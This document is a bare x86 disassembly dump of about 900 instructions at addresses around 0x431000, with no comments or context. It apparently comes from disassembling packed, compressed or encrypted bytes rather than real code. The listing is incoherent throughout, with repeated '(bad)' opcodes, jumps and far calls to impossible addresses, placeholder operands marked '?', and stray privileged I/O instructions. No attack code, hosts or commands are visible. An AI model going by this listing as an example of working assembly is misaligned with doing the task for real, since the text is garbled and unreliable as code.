  4311a8:	mov    bh,0xe0
  4311aa:	dec    edi
  4311ab:	mov    al,ds:0xb1b01df3
  4311b0:	push   cs
  4311b1:	(bad)  
  4311b2:	retf   0xdd38
  4311b5:	mov    ebx,0x65722053
  4311ba:	mov    WORD PTR [edi],?
  4311bc:	pop    esp
  4311bd:	sbb    eax,0x691d4419
  4311c2:	mov    WORD PTR [edx+0x23a2640e],?
  4311c8:	pop    esp
  4311c9:	push   0x30
  4311cb:	jecxz  0x43115f
  4311cd:	jmp    0xbf45c465
  4311d2:	into   
  4311d3:	mov    al,ds:0x880760c1
  4311d8:	xchg   edi,eax
  4311d9:	repz push cs
  4311db:	imul   esp,DWORD PTR [edx-0x1d],0x1e
  4311df:	fcomp  QWORD PTR ds:0xfafda62
  4311e5:	pop    ds
  4311e6:	or     ebp,edi
  4311e8:	retf   0x2000
  4311eb:	jg     0x4311b8
  4311ed:	or     DWORD PTR [esi-0x4d],0x62
  4311f1:	push   ss
  4311f2:	add    BYTE PTR [eax],al
  4311f4:	add    BYTE PTR [eax],al
  4311f6:	add    BYTE PTR [edx-0x64],al
  4311f9:	bound  ecx,QWORD PTR [edx]
  4311fb:	bnd ja 0x431211
  4311fe:	mov    DWORD PTR [eax+0x43],ebp
  431201:	push   cs
  431202:	mov    BYTE PTR [ebp+edx*1+0x3275c76d],dh
  431209:	into   
  43120a:	add    al,0x52
  43120c:	fisubr WORD PTR [edx+eax*8+0x35]
  431210:	or     dl,bh
  431212:	xor    edi,ecx
  431214:	jb     0x4311c2
  431216:	mov    edx,esp
  431218:	push   cs
  431219:	cmp    al,al
  43121b:	mov    cl,0x78
  43121d:	lock cmp DWORD PTR [edx+edx*1-0x17],0xffffffe8
  431223:	push   esi
  431224:	mov    edi,0xb6fb000d
  431229:	push   cs
  43122a:	push   esi
  43122b:	mov    dl,0x4
  43122d:	jb     0x43122e
  43122f:	ja     0x43122e
  431231:	add    dl,BYTE PTR [edx+ebp*8]
  431234:	jb     0x431221
  431236:	test   BYTE PTR [ecx],bh
  431238:	xchg   DWORD PTR [ecx],ebx
  43123a:	cmp    eax,0xeb369
  43123f:	aad    0xa9
  431241:	inc    eax
  431242:	jmp    esp
  431244:	xchg   edx,eax
  431245:	sbb    DWORD PTR [eax-0x7],eax
  431248:	ror    esi,0x5e
  43124b:	stos   BYTE PTR es:[edi],al
  43124c:	sub    cl,ch
  43124e:	pop    esi
  43124f:	stos   BYTE PTR es:[edi],al
  431250:	xor    dh,bh
  431252:	sbb    al,0x2a
  431254:	push   0xc2a38b3d
  431259:	stc    
  43125a:	push   0x0
  43125f:	add    BYTE PTR [esi-0x61],ch
  431262:	jmp    0x431263
  431264:	and    edi,esi
  431266:	inc    edx
  431267:	push   ebx
  431268:	add    esi,DWORD PTR [edi+eiz*8-0x1bda6feb]
  43126f:	aas    
  431270:	nop
  431271:	adc    al,0x40
  431273:	jle    0x43120b
  431275:	mov    ebx,eax
  431277:	daa    
  431278:	sbb    edx,esi
  43127a:	test   eax,0x5408eb5c
  43127f:	sbb    edx,DWORD PTR [edx-0x6c]
  431282:	movq   mm4,mm6
  431285:	scas   eax,DWORD PTR es:[edi]
  431286:	loop   0x431295
  431288:	in     al,0x6d
  43128a:	xchg   ebp,eax
  43128b:	inc    ebx
  43128c:	lods   al,BYTE PTR ds:[esi]
  43128d:	xchg   edi,eax
  43128e:	lahf   
  43128f:	cli    
  431290:	test   ebx,esi
  431292:	fnstsw WORD PTR [edi]
  431294:	nop
  431295:	es iret 
  431297:	and    ebx,DWORD PTR [ebx+edi*4+0x7ff01447]
  43129e:	iret   
  43129f:	jmp    FWORD PTR [ecx-0x22ab6176]
  4312a5:	es iret 
  4312a7:	and    ecx,DWORD PTR [ebx+ebx*8-0x5fcbebb9]
  4312ae:	iret   
  4312af:	call   DWORD PTR [esp+ecx*2]
  4312b2:	mov    ebp,0xa1022bca
  4312b7:	xchg   BYTE PTR [ecx],al
  4312b9:	mov    BYTE PTR [edi+0x14],0x94
  4312bd:	jp     0x43128e
  4312bf:	jmp    DWORD PTR [ebp+0xc]
  4312c2:	ficomp WORD PTR [edi+0x0]
  4312c5:	add    BYTE PTR [eax],al
  4312c7:	add    BYTE PTR [eax],al
  4312c9:	mov    ds:0xd35a0f4b,al
  4312ce:	pop    edx
  4312cf:	stc    
  4312d0:	jmp    FWORD PTR [edi-0x75]
  4312d3:	movups xmm2,XMMWORD PTR [eax-0x7e602214]
  4312da:	dec    ebx
  4312db:	jne    0x505c7ab1
  4312e1:	(bad)  
  4312e2:	jle    0x4312d3
  4312e4:	or     eax,0x7f8b50
  4312e9:	shl    DWORD PTR [edx+0x1ee43c7],cl
  4312ef:	mov    ds:0xaca40eb1,eax
  4312f4:	mov    ss,WORD PTR [ecx-0x22]
  4312f7:	enter  0xe3e,0x1f
  4312fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4312fc:	fisttp DWORD PTR [esi-0x37919f61]
  431302:	std    
  431303:	mov    ebp,0xc12fb0d1
  431308:	jns    0x431380
  43130a:	add    al,0x16
  43130c:	rcr    BYTE PTR [esi+0x6aede729],1
  431312:	or     ch,al
  431314:	push   es
  431315:	inc    edx
  431316:	sub    DWORD PTR [edx-0x2d7a2195],ecx
  43131c:	pop    edx
  43131d:	adc    al,0x72
  43131f:	and    DWORD PTR [ecx],ecx
  431321:	xchg   ecx,ebx
  431323:	add    al,0xfc
  431325:	lods   eax,DWORD PTR ds:[esi]
  431326:	jge    0x431310
  431328:	inc    ebx
  431329:	(bad)  
  43132b:	push   edx
  43132c:	mov    edi,0x0
  431331:	add    dh,ch
  431333:	sub    BYTE PTR [eax+eiz*1],dh
  431336:	adc    eax,0xe30b1db6
  43133b:	lods   eax,DWORD PTR ds:[esi]
  43133c:	lds    ecx,FWORD PTR [esi-0x9d412e]
  431342:	pop    ss
  431343:	sub    ecx,esi
  431345:	adc    eax,DWORD PTR [edi]
  431347:	ja     0x4312d9
  431349:	pop    edi
  43134a:	fs add al,0x5
  43134d:	(bad)  
  43134e:	jnp    0x431326
  431350:	in     eax,0x2e
  431352:	lods   eax,DWORD PTR ds:[esi]
  431353:	push   ds
  431354:	fidivr DWORD PTR [edi-0x1207f519]
  43135a:	fisttp WORD PTR [edx]
  43135c:	test   BYTE PTR [eax-0x4c0e29ad],0x16
  431363:	mov    ds:0xd6435a83,eax
  431368:	push   cs
  431369:	add    DWORD PTR [edi],ecx
  43136b:	xchg   edi,eax
  43136c:	js     0x43139c
  43136e:	pop    edx
  43136f:	(bad)  
  431370:	mov    ds:0x929cd3f8,al
  431375:	sub    edi,edx
  431377:	(bad)  
  431378:	js     0x431363
  43137a:	lods   eax,DWORD PTR ds:[esi]
  43137b:	mov    al,0x99
  43137d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43137e:	ja     0x43133a
  431380:	ds je  0x431312
  431383:	leave  
  431384:	ds xchg edi,eax
  431386:	jmp    0x929c:0x53d832c6
  43138d:	sub    DWORD PTR [edi-0x50],eax
  431390:	sahf   
  431391:	call   0xe8bbda92
  431396:	add    BYTE PTR [eax],al
  431398:	add    BYTE PTR [eax],al
  43139a:	add    BYTE PTR [edx+esi*2+0x3e],bh
  43139e:	cmp    DWORD PTR [esp+ebp*8],esp
  4313a1:	jmp    0x4313f8
  4313a3:	mov    al,0xd6
  4313a5:	inc    esp
  4313a6:	(bad)  
  4313a7:	aas    
  4313a8:	pusha  
  4313a9:	std    
  4313aa:	sub    BYTE PTR [esp+ecx*8-0x105e932],cl
  4313b1:	shl    cl,1
  4313b3:	xchg   ebx,eax
  4313b4:	add    BYTE PTR [ebp+eiz*4+0x30],al
  4313b8:	xor    eax,0xb293d901
  4313bd:	push   cs
  4313be:	(bad)  
  4313bf:	out    0xa7,al
  4313c1:	xchg   edi,eax
  4313c2:	cmp    esp,DWORD PTR [eax]
  4313c4:	xor    eax,0xc42ad160
  4313c9:	push   cs
  4313ca:	jmp    0xbb2edf62
  4313cf:	push   ebx
  4313d0:	inc    edi
  4313d1:	sub    cl,BYTE PTR [eax]
  4313d3:	fcomp  DWORD PTR [ebp+0x68530937]
  4313d9:	sbb    edx,ebp
  4313db:	dec    ebx
  4313dc:	jge    0x4313bc
  4313de:	push   0xa3ab0439
  4313e3:	in     eax,0x34
  4313e5:	push   eax
  4313e6:	add    cl,ch
  4313e8:	sbb    DWORD PTR cs:[ebp+0x70],esi
  4313ec:	pop    ecx
  4313ed:	inc    ebp
  4313ee:	ret    
  4313ef:	pop    ds
  4313f0:	das    
  4313f1:	fiadd  WORD PTR [ebx+0x1061af4f]
  4313f7:	or     edx,0x1bb90028
  4313fd:	lods   al,BYTE PTR ds:[esi]
  4313fe:	je     0x431400
  431400:	add    BYTE PTR [eax],al
  431402:	add    BYTE PTR [eax],al
  431404:	scas   al,BYTE PTR es:[edi]
  431405:	sbb    ch,BYTE PTR ss:[eax+0x15]
  431409:	pop    ebx
  43140a:	jmp    0x43140c
  43140c:	shl    DWORD PTR [esi],cl
  43140e:	js     0x431454
  431410:	jns    0x43144a
  431412:	(bad)  
  431413:	ins    BYTE PTR es:[edi],dx
  431414:	sub    eax,0xe682f6af
  431419:	stc    
  43141a:	call   0x4fd631c2
  43141f:	add    ah,ch
  431421:	out    dx,eax
  431422:	bound  eax,QWORD PTR [ebx+edi*2]
  431425:	test   BYTE PTR [ebp-0x3d],0xec
  431429:	add    DWORD PTR [ebx+0xa],esp
  43142c:	adc    bl,bl
  43142e:	jnp    0x431474
  431430:	cmp    DWORD PTR [edi],eax
  431432:	stc    
  431433:	scas   al,BYTE PTR es:[edi]
  431434:	sub    DWORD PTR [edi-0x6a22b0a],ebp
  43143a:	call   0xf2c84f7b
  43143f:	call   0x51d88c
  431444:	retf   
  431445:	inc    ebx
  431446:	jnp    0x43148c
  431448:	sub    DWORD PTR [ebx],ebx
  43144a:	lods   al,BYTE PTR ds:[esi]
  43144b:	jne    0x431436
  43144d:	push   es
  43144e:	stos   DWORD PTR es:[edi],eax
  43144f:	adc    al,0x87
  431451:	cli    
  431452:	daa    
  431453:	add    al,0xfa
  431455:	call   0x438e1715
  43145a:	jnp    0x4314a0
  43145c:	stc    
  43145d:	sbb    ebx,esi
  43145f:	jne    0x43144e
  431461:	ret    0x71ec
  431464:	nop
  431465:	inc    esp
  431466:	jg     0x431468
  431468:	add    BYTE PTR [eax],al
  43146a:	add    BYTE PTR [eax],al
  43146c:	add    BYTE PTR [esi],dh
  43146e:	enter  0x86bc,0xbc
  431472:	or     DWORD PTR [edi+eax*1-0x6e],esi
  431476:	mov    DWORD PTR [edi],ecx
  431478:	repnz ror DWORD PTR [ecx+0x1d2822dc],1
  43147f:	hlt    
  431480:	inc    ebx
  431481:	nop
  431482:	pop    edx
  431483:	add    cl,cl
  431485:	mov    eax,0x9ff99d3b
  43148a:	or     al,0x50
  43148c:	je     0x43141a
  43148e:	ja     0x4314df
  431490:	enter  0x4453,0x9b
  431494:	imul   ecx,esp,0x9265a08b
  43149a:	inc    edx
  43149b:	ja     0x431505
  43149d:	fimul  WORD PTR [ecx-0x7af7cbd]
  4314a3:	js     0x43150c
  4314a5:	mov    WORD PTR [edx+0x70d000f],cs
  4314ab:	dec    ebx
  4314ac:	cld    
  4314ad:	push   edi
  4314ae:	imul   esp,DWORD PTR [edx-0x228f6f9b],0x12cba13b
  4314b8:	xchg   DWORD PTR [eax+0xf],esp
  4314bb:	xchg   esi,eax
  4314bc:	div    DWORD PTR ds:0x4fe74349
  4314c2:	bound  eax,QWORD PTR [ebp-0x6]
  4314c5:	or     eax,0xaca7af4c
  4314ca:	(bad)  
  4314cb:	adc    cl,BYTE PTR [ebx]
  4314cd:	std    
  4314ce:	dec    ebx
  4314cf:	pop    ecx
  4314d0:	mov    esi,0x0
  4314d5:	add    BYTE PTR [ebp+0x24],ah
  4314d8:	ja     0x43145a
  4314da:	hlt    
  4314db:	adc    ecx,DWORD PTR [edi]
  4314dd:	add    BYTE PTR [eax-0x2e0e4447],dl
  4314e3:	mov    dl,BYTE PTR [esp+eax*4]
  4314e6:	sbb    esi,DWORD PTR [ebx+0x329003f5]
  4314ec:	or     bl,BYTE PTR [eax+0x4f5ee6f]
  4314f2:	mov    esi,DWORD PTR [eax]
  4314f4:	data16 add al,0x90
  4314f7:	mov    dl,0xe8
  4314f9:	dec    ebp
  4314fa:	jbe    0x431495
  4314fc:	ror    DWORD PTR [edx-0x3c2f94f6],cl
  431502:	mov    bh,0x26
  431504:	inc    edx
  431505:	in     al,dx
  431506:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  431507:	cdq    
  431508:	xor    al,0x6c
  43150a:	retf   0xc7e
  43150d:	push   edi
  43150e:	or     al,0x30
  431510:	std    
  431511:	pop    eax
  431512:	call   0xf60b:0x8fe9a599
  431519:	push   esi
  43151a:	inc    edx
  43151b:	add    BYTE PTR [eax-0x9f4803d],0x56
  431522:	pushf  
  431523:	push   cs
  431524:	leave  
  431525:	ret    
  431526:	outs   dx,DWORD PTR ds:[esi]
  431527:	cs mov ch,0xd0
  43152a:	mov    edx,0x66eb7227
  43152f:	cdq    
  431530:	les    ecx,FWORD PTR [eax+0x56da99fc]
  431536:	dec    edx
  431537:	add    ah,BYTE PTR [ecx+0x49]
  43153a:	add    BYTE PTR [eax],al
  43153c:	add    BYTE PTR [eax],al
  43153e:	add    BYTE PTR [edi],ch
  431540:	mov    al,ds:0x2f3a5603
  431545:	mov    ch,0xcf
  431547:	mov    ds:0xbbabe299,al
  43154c:	out    dx,al
  43154d:	cmc    
  43154e:	mov    BYTE PTR [edx+ebx*4],cl
  431551:	mov    dl,BYTE PTR [esi+0x1a]
  431554:	add    al,BYTE PTR [ebp+0x35c393f0]
  43155a:	add    al,0x15
  43155c:	jb     0x431547
  43155e:	or     al,BYTE PTR [edi+0x7ebdf971]
  431564:	cdq    
  431565:	push   cs
  431566:	sbb    eax,0xc5f739e2
  43156b:	cli    
  43156c:	mov    ds:0x6d65721a,al
  431571:	ja     0x43151c
  431573:	xchg   ebx,eax
  431574:	stos   DWORD PTR es:[edi],eax
  431575:	adc    ecx,eax
  431577:	out    dx,eax
  431578:	hlt    
  431579:	push   cs
  43157a:	inc    edx
  43157b:	ret    0x7651
  43157e:	aad    0x7
  431580:	cdq    
  431581:	mov    bl,0xe8
  431583:	iret   
  431584:	scas   al,BYTE PTR es:[edi]
  431585:	sbb    DWORD PTR [ecx-0x72],ecx
  431588:	mov    dl,0xe
  43158a:	mov    bh,BYTE PTR [ebx-0x2116acf4]
  431590:	dec    eax
  431591:	or     eax,0x41584cbf
  431596:	bound  ebp,QWORD PTR [edi]
  431598:	xor    bh,dl
  43159a:	mov    ebp,0x9aeb988f
  43159f:	xor    eax,0xad7705
  4315a4:	add    BYTE PTR [eax],al
  4315a6:	add    BYTE PTR [eax],al
  4315a8:	(bad)  
  4315a9:	hlt    
  4315aa:	push   cs
  4315ab:	mul    BYTE PTR [edi+0x34]
  4315ae:	add    BYTE PTR [ecx+0x1acec793],ch
  4315b4:	test   eax,0xb9c39926
  4315b9:	pushf  
  4315ba:	jmp    0x43161c
  4315bc:	pop    edi
  4315bd:	or     al,0x60
  4315bf:	and    eax,0x4db01494
  4315c4:	popa   
  4315c5:	hlt    
  4315c6:	push   cs
  4315c7:	inc    edi
  4315c8:	icebp  
  4315c9:	punpcklbw mm5,DWORD PTR ds:0x3909298c
  4315d0:	inc    ecx
  4315d1:	hlt    
  4315d2:	push   cs
  4315d3:	xchg   ecx,eax
  4315d4:	inc    ebx
  4315d5:	fsubr  st,st(3)
  4315d7:	sahf   
  4315d8:	pop    ss
  4315d9:	dec    eax
  4315da:	mov    al,ds:0x97b293e8
  4315df:	lahf   
  4315e0:	jl     0x4315d8
  4315e2:	inc    esp
  4315e3:	add    cl,bh
  4315e5:	mov    bl,0x91
  4315e7:	rcl    BYTE PTR [ecx+0x6c147172],0x6f
  4315ee:	mov    edi,0x5c488951
  4315f3:	push   ebx
  4315f4:	outs   dx,BYTE PTR ds:[esi]
  4315f5:	xchg   ebx,esp
  4315f7:	adc    ch,BYTE PTR [ecx]
  4315f9:	mov    ah,0x91
  4315fb:	sar    BYTE PTR [edi-0x2c68f3d],0x58
  431602:	fnstenv [ebp+edi*4+0x32]
  431606:	jecxz  0x43161c
  431608:	cld    
  431609:	mov    bh,0x3b
  43160b:	leave  
  43160c:	add    BYTE PTR [eax],al
  43160e:	add    BYTE PTR [eax],al
  431610:	add    bh,al
  431612:	sub    al,0x57
  431614:	inc    ebp
  431615:	test   DWORD PTR [edi],ebp
  431617:	push   edx
  431618:	aam    0xe9
  43161a:	cmp    DWORD PTR [edi-0x664c0a92],ebx
  431620:	lea    esi,[ecx-0x1]
  431623:	call   0x3ddda827
  431628:	dec    BYTE PTR [esi-0x1bf053e9]
  43162e:	out    dx,al
  43162f:	pop    eax
  431631:	hlt    
  431632:	lods   al,BYTE PTR ds:[esi]
  431633:	cmp    eax,eax
  431635:	pop    ss
  431636:	sub    al,0x92
  431638:	enter  0xfe6c,0xe8
  43163c:	mov    ecx,0xeb44f
  431641:	in     al,dx
  431642:	sbb    dl,al
  431644:	sti    
  431645:	pop    esi
  431646:	(bad)  
  431647:	xchg   ebx,eax
  431648:	sbb    BYTE PTR [ecx+0x6b],bh
  43164b:	(bad)  
  43164c:	cli    
  43164d:	loope  0x431639
  43164f:	mov    WORD PTR [eax+0x29],es
  431652:	xor    BYTE PTR [edx-0x17020338],dl
  431658:	push   eax
  431659:	out    dx,al
  43165a:	xchg   DWORD PTR [edi+0x3bae6911],esi
  431660:	call   DWORD PTR [eax-0x6c9a4628]
  431666:	loopne 0x431660
  431668:	add    BYTE PTR [eax-0x77],bh
  43166b:	lldt   WORD PTR [eax]
  43166e:	push   es
  43166f:	ins    DWORD PTR es:[edi],dx
  431670:	(bad)  
  431671:	cmc    
  431672:	pop    ds
  431673:	inc    ebx
  431674:	dec    edi
  431675:	add    BYTE PTR [eax],al
  431677:	add    BYTE PTR [eax],al
  431679:	add    bh,dl
  43167b:	int    0x46
  43167d:	stc    
  43167e:	xchg   ecx,eax
  43167f:	mov    DWORD PTR [edi],ecx
  431681:	jg     0x43164e
  431683:	test   DWORD PTR [edx+0x14],0xffcf9b4c
  43168a:	sbb    bh,cl
  43168c:	mov    ?,ecx
  43168e:	(bad)  
  43168f:	push   esp
  431690:	cs push ebx
  431692:	or     eax,0xb74f434e
  431697:	push   ebp
  431698:	inc    ebx
  431699:	mov    WORD PTR ds:0xa7fa44d1,ss
  43169f:	pop    eax
  4316a0:	mov    ecx,0xdd4985fa
  4316a5:	aas    
  4316a6:	nop
  4316a7:	push   es
  4316a8:	push   eax
  4316a9:	or     dl,ch
  4316ab:	inc    esi
  4316ac:	inc    ebx
  4316ad:	push   ecx
  4316ae:	xchg   DWORD PTR [edi-0x11],esi
  4316b1:	or     eax,0xb1778bd0
  4316b6:	add    DWORD PTR [esi+0x2b9d863f],ebx
  4316bc:	repz inc ebx
  4316be:	nop
  4316bf:	xor    DWORD PTR [ebx-0x36],0x5f
  4316c3:	jne    0x431647
  4316c5:	add    BYTE PTR [edi+0x53c8bbdd],dh
  4316cb:	fild   QWORD PTR [ebx-0x15]
  4316ce:	adc    ebp,DWORD PTR [eax+0x5a]
  4316d1:	mov    al,ds:0xffd6e7a8
  4316d6:	adc    BYTE PTR [eax-0x2],dh
  4316d9:	add    dl,BYTE PTR [eax+0x51a48b]
  4316df:	add    BYTE PTR [eax],al
  4316e1:	add    BYTE PTR [eax],al
  4316e3:	mov    edi,0xb52d60b2
  4316e8:	mov    dl,0x60
  4316ea:	push   edi
  4316eb:	mov    eax,0x9b059b31
  4316f0:	out    dx,al
  4316f1:	mov    dh,0xa7
  4316f3:	outs   dx,DWORD PTR ds:[esi]
  4316f4:	push   es
  4316f5:	cmp    al,BYTE PTR [eax+ebp*8]
  4316f8:	lea    ebp,[ecx+0x53]
  4316fb:	cli    
  4316fc:	push   ecx
  4316fd:	jne    0x4316df
  4316ff:	push   ebx
  431700:	mov    dl,0x72
  431702:	inc    esp
  431703:	call   0x8b2:0x9004d72e
  43170a:	push   ebx
  43170b:	or     al,0x9d
  43170d:	retf   0x62f3
  431710:	xchg   ebp,eax
  431711:	loop   0x431696
  431713:	xchg   ebp,eax
  431714:	repnz cmc 
  431716:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  431717:	cmp    eax,DWORD PTR [esi]
  431719:	mov    dl,0x3
  43171b:	or     eax,0xe6205073
  431720:	inc    esi
  431721:	cwde   
  431722:	les    esp,FWORD PTR [edi-0x63a3e2d8]
  431728:	cdq    
  431729:	or     al,0x53
  43172b:	push   cs
  43172c:	test   al,0x75
  43172e:	loopne 0x431703
  431730:	mov    dl,0xa5
  431732:	lea    ecx,[ebx+0x51]
  431735:	mov    ch,0x3
  431737:	push   0x7a531086
  43173c:	sub    edx,esi
  43173e:	iret   
  43173f:	sti    
  431740:	out    dx,al
  431741:	cmc    
  431742:	jle    0x43179b
  431744:	mov    dh,bl
  431746:	dec    esp
  431747:	add    BYTE PTR [eax],al
  431749:	add    BYTE PTR [eax],al
  43174b:	add    BYTE PTR [edx-0x6b],bl
  43174e:	jno    0x431793
  431750:	mov    ch,BYTE PTR [esi]
  431752:	fild   WORD PTR [eax+edx*4]
  431755:	mov    dl,0x70
  431757:	inc    ecx
  431758:	das    
  431759:	test   eax,0x2e3a52a3
  43175e:	mov    ch,0x2
  431760:	or     al,0xa9
  431762:	push   cs
  431763:	call   0x25dcc9fb
  431768:	js     0x43172c
  43176a:	adc    DWORD PTR ds:[esi-0x3d16146c],edx
  431771:	mov    esi,0x94d3fcfa
  431776:	cwde   
  431777:	mov    ds:0x86ea536b,al
  43177c:	bound  esi,QWORD PTR [ecx]
  43177e:	into   
  43177f:	out    dx,al
  431780:	jns    0x2fd70094
  431786:	in     al,0xf4
  431788:	scas   al,BYTE PTR es:[edi]
  431789:	add    DWORD PTR [ebx+edx*8-0x6c],eax
  43178d:	or     dl,BYTE PTR [ebx-0x136b3033]
  431793:	cld    
  431794:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  431796:	dec    esi
  431797:	jmp    0xba7dbdaa
  43179c:	xlat   BYTE PTR ds:[ebx]
  43179d:	xchg   esp,eax
  43179e:	in     al,dx
  43179f:	mov    bl,BYTE PTR [ebx+0x18e95305]
  4317a5:	push   ebp
  4317a6:	sbb    esp,DWORD PTR [ebp+0x58]
  4317a9:	xchg   ebp,eax
  4317aa:	jmp    0x431795
  4317ac:	or     eax,0xa57b1d
  4317b1:	add    BYTE PTR [eax],al
  4317b3:	add    BYTE PTR [eax],al
  4317b5:	xchg   ebx,eax
  4317b6:	adc    eax,0x49eb16d6
  4317bb:	es jmp 0x95bd4b54
  4317c1:	push   edi
  4317c2:	xchg   esp,eax
  4317c3:	xchg   edx,eax
  4317c4:	sub    DWORD PTR [edx-0x6c1648d2],edx
  4317ca:	mov    dl,0xeb
  4317cc:	mov    ecx,0xf956bec2
  4317d1:	push   ebx
  4317d2:	xchg   esp,eax
  4317d3:	mov    al,0x59
  4317d5:	jo     0x4317c7
  4317d7:	push   cs
  4317d8:	cmp    ebx,esi
  4317da:	pop    es
  4317db:	jnp    0x431802
  4317dd:	mov    WORD PTR [edx+eiz*2+0x0],ds
  4317e1:	in     eax,0x6a
  4317e3:	jmp    0x4317e3
  4317e5:	cmp    DWORD PTR [esi-0x17],esi
  4317e8:	pop    eax
  4317e9:	push   ecx
  4317ea:	sbb    al,0x71
  4317ec:	(bad)  
  4317ed:	not    BYTE PTR ds:0x2c0e8d5
  4317f3:	jmp    0x6031c5f7
  4317f8:	jle    0x431820
  4317fa:	pushf  
  4317fb:	mov    ds:0x8baeb911,eax
  431800:	sar    cl,0x6b
  431803:	jmp    0x431789
  431805:	jg     0x431882
  431807:	push   ebp
  431808:	push   ecx
  431809:	jb     0x43179e
  43180b:	ins    BYTE PTR es:[di],dx
  43180d:	lods   eax,DWORD PTR ds:[esi]
  43180e:	scas   al,BYTE PTR es:[edi]
  43180f:	test   BYTE PTR [esi+0x3e],0x1
  431813:	jmp    0x48bdc19d
  431818:	sub    eax,DWORD PTR [eax]
  43181a:	add    BYTE PTR [eax],al
  43181c:	add    BYTE PTR [eax],al
  43181e:	mov    esp,0xb9447763
  431823:	dec    esi
  431824:	das    
  431825:	jae    0x431814
  431827:	scas   eax,DWORD PTR es:[edi]
  431828:	xchg   ecx,eax
  431829:	idiv   ah
  43182b:	rcr    BYTE PTR [ecx+0xe4e9d8c],cl
  431831:	add    BYTE PTR [ecx-0x56fc1b09],bh
  431837:	scas   eax,DWORD PTR es:[edi]
  431838:	cdq    
  431839:	test   ch,cl
  43183b:	leave  
  43183c:	in     al,dx
  43183d:	(bad)  
  43183e:	jns    0x43189a
  431840:	pop    ebx
  431841:	push   0x4f7cbd
  431846:	xchg   esi,eax
  431847:	mov    ebx,0xaf2d6c62
  43184c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43184d:	adc    cl,dl
  43184f:	sbb    eax,0x7eadb990
  431854:	dec    edi
  431855:	add    BYTE PTR [ecx+0x4e],al
  431858:	mov    ah,0x0
  43185a:	imul   edx,DWORD PTR [esi],0x2890e8d5
  431860:	pop    ebx
  431861:	cli    
  431862:	inc    edi
  431863:	or     eax,0x53a67350
  431868:	push   edx
  431869:	std    
  43186a:	ret    
  43186b:	mov    WORD PTR [edi+0x4c],es
  43186e:	sub    eax,0x93e63e5c
  431873:	cwde   
  431874:	dec    edi
  431875:	aas    
  431876:	adc    al,0x49
  431878:	push   cs
  431879:	xchg   ebp,eax
  43187a:	push   eax
  43187b:	inc    eax
  43187c:	adc    DWORD PTR [esi],ebp
  43187e:	rcr    bl,1
  431880:	mov    al,ds:0x56
  431885:	add    BYTE PTR [eax],al
  431887:	sbb    ebp,DWORD PTR [esi]
  431889:	mov    esp,0x4c2065be
  43188e:	and    ah,0x8c
  431891:	out    0xff,eax
  431893:	out    dx,eax
  431894:	mov    dl,0x69
  431896:	lock adc eax,0xdff80ff6
  43189c:	or     ecx,DWORD PTR [eax-0x6e]
  43189f:	xchg   ebx,eax
  4318a0:	mov    DWORD PTR [edi],ecx
  4318a2:	lea    ebx,ds:0xc7fa5c2f
  4318a8:	lock push esp
  4318aa:	cmp    al,0xbf
  4318ac:	jmp    0x431918
  4318ae:	(bad)  
  4318af:	scas   al,BYTE PTR es:[edi]
  4318b0:	mov    DWORD PTR [edi],ecx
  4318b2:	add    BYTE PTR [edx],bh
  4318b4:	xchg   DWORD PTR [esp+ecx*4+0xe],ebp
  4318b8:	loope  0x4318f8
  4318ba:	cli    
  4318bb:	inc    ecx
  4318bc:	push   ds
  4318bd:	lods   eax,DWORD PTR ds:[esi]
  4318be:	xchg   edi,eax
  4318bf:	inc    ecx
  4318c0:	pop    ebx
  4318c1:	cwde   
  4318c2:	ret    
  4318c3:	add    BYTE PTR [eax+0xf],ah
  4318c6:	call   0x530d94
  4318cb:	cmp    DWORD PTR [edx+0x1e900010],ebp
  4318d1:	xchg   ebp,eax
  4318d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4318d3:	ins    DWORD PTR es:[edi],dx
  4318d4:	mov    DWORD PTR [ebx-0x3f],ebx
  4318d7:	nop
  4318d8:	fwait
  4318d9:	iret   
  4318da:	dec    eax
  4318db:	in     eax,0xb2
  4318dd:	out    dx,al
  4318de:	or     esp,0x90da252a
  4318e4:	sbb    bh,BYTE PTR [edx-0x20]
  4318e7:	shl    DWORD PTR [edx+0xf9dc],cl
  4318ed:	add    BYTE PTR [eax],al
  4318ef:	add    BYTE PTR [ebx-0x5b],dh
  4318f2:	xor    eax,0x72830f04
  4318f7:	push   esi
  4318f8:	mov    ds:0x17f9a4a8,eax
  4318fd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4318fe:	xor    eax,0xf5495d04
  431903:	add    edx,DWORD PTR [eax+0xab5df07]
  431909:	test   al,0x15
  43190b:	repnz (bad) 
  43190d:	mov    dl,0xc8
  43190f:	push   ebp
  431910:	push   ss
  431911:	jns    0x431946
  431913:	cmp    eax,0x6060e836
  431918:	adc    BYTE PTR [edi-0x4d6ff6b3],bl
  43191e:	add    esi,DWORD PTR [edi-0x7e9d73ea]
  431924:	aas    
  431925:	mov    WORD PTR [edi+ecx*2+0x16],cs
  431929:	test   DWORD PTR [ebp-0xc],ecx
  43192c:	(bad)  
  43192d:	xchg   ecx,eax
  43192e:	cmc    
  43192f:	adc    BYTE PTR [ecx+esi*2],0x4f
  431933:	dec    edi
  431934:	mov    edx,0x16fba291
  431939:	push   0xffffff85
  43193b:	mov    ch,0xaa
  43193d:	(bad)  
  43193e:	mov    eax,ds:0x6eb253df
  431943:	dec    eax
  431944:	daa    
  431945:	div    ch
  431947:	pop    ebx
  431948:	dec    ecx
  431949:	pop    esp
  43194a:	cmc    
  43194b:	add    ebp,ebx
  43194d:	lock cs inc edx
  431950:	xchg   ebx,eax
  431951:	mov    dl,0x8a
  431953:	jp     0x431955
  431955:	add    BYTE PTR [eax],al
  431957:	add    BYTE PTR [eax],al
  431959:	imul   esi,DWORD PTR ds:0xe4c1e019,0xe
  431960:	sub    DWORD PTR fs:[ecx],ebp
  431963:	idiv   BYTE PTR [edx]
  431965:	iret   
  431966:	mov    ebx,gs
  431968:	je     0x4319b2
  43196a:	sub    DWORD PTR [esi],edi
  43196c:	sbb    ah,dh
  43196e:	jecxz  0x4319e6
  431970:	ins    DWORD PTR es:[edi],dx
  431971:	addr16 cmc 
  431973:	push   cs
  431974:	into   
  431975:	cmp    ch,dl
  431977:	jmp    FWORD PTR [eax]
  431979:	mov    WORD PTR [edi],?
  43197b:	into   
